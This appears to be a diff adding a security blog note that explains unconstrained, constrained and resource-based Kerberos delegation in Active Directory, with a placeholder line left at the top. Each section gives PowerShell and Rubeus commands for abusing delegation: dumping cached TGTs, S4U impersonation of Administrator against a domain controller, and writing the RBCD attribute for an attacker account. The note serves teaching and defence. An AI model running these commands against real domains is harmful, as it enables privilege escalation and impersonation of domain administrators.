@@ -1,0 +1,72 @@
+---
+title: "Understanding Kerberos Delegation"
+date: "2025-07-20"
+summary: "A technical breakdown of Kerberos delegation types — unconstrained, constrained, and resource-based constrained delegation (RBCD) — and how each is exploited in Active Directory attacks."
+tags: ["active-directory", "kerberos", "windows", "privilege-escalation"]
+draft: false
+featured: false
+---
+
+> This is a placeholder note. Replace with your actual technical note content.
+
+## What is Kerberos Delegation?
+
+Kerberos delegation allows a service to impersonate a user to access another service. It was designed for multi-tier architectures where a front-end service needs to access a backend service on behalf of a user.
+
+There are three delegation types:
+
+| Type | Introduced | Restriction |
+|---|---|---|
+| Unconstrained | Windows 2000 | None — can impersonate to any service |
+| Constrained | Windows 2003 | Constrained to specific SPNs |
+| RBCD | Windows 2012 R2 | Configured on the backend resource |
+
+## Unconstrained Delegation
+
+When a machine account is set for unconstrained delegation, any user who authenticates to a service running on that machine will have their TGT cached on the machine.
+
+**Exploit path:**
+
+```powershell
+# Find machines with unconstrained delegation
+Get-ADComputer -Filter {TrustedForDelegation -eq $true} -Properties TrustedForDelegation
+
+# Wait for a domain admin to authenticate to this machine (or coerce with PrinterBug/PetitPotam)
+# Rubeus — dump TGTs
+Rubeus.exe monitor /interval:5 /nowrap
+```
+
+## Constrained Delegation
+
+Constrained delegation limits which services a principal can delegate to, specified via the `msDS-AllowedToDelegateTo` attribute.
+
+**Key note:** S4U2Self + S4U2Proxy allows the service to request a service ticket for *any* user, even without a forwarded TGT.
+
+```powershell
+# Find accounts with constrained delegation configured
+Get-ADUser -Filter {TrustedToAuthForDelegation -eq $true} -Properties msDS-AllowedToDelegateTo |
+  Select-Object Name, msDS-AllowedToDelegateTo
+
+# Exploit with Rubeus
+Rubeus.exe s4u /user:serviceAccount /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01.domain.local /nowrap
+```
+
+## Resource-Based Constrained Delegation (RBCD)
+
+RBCD flips the model — delegation is configured on the *target* resource by setting `msDS-AllowedToActOnBehalfOfOtherIdentity`.
+
+**Exploit requirement:** Write access to the target machine's AD object.
+
+```powershell
+# Add a controlled computer account to the target's RBCD attribute
+Set-ADComputer dc01 -PrincipalsAllowedToDelegateToAccount attacker$
+
+# Obtain a TGT for our controlled account, then S4U2Self+Proxy
+Rubeus.exe s4u /user:attacker$ /rc4:HASH /impersonateuser:Administrator /msdsspn:cifs/dc01 /nowrap
+```
+
+## References
+
+- [The Hacker Recipes — Kerberos Delegation](https://www.thehacker.recipes/ad/movement/kerberos/delegations)
+- [HarmJ0y — The Most Dangerous User Right You Probably Have Never Heard Of](https://blog.harmj0y.net/activedirectory/s4u2pwnage/)
+- [ElasticSecurity — Detecting Kerberos Delegation Abuse](https://www.elastic.co/blog/detecting-kerberos-delegation-abuse)
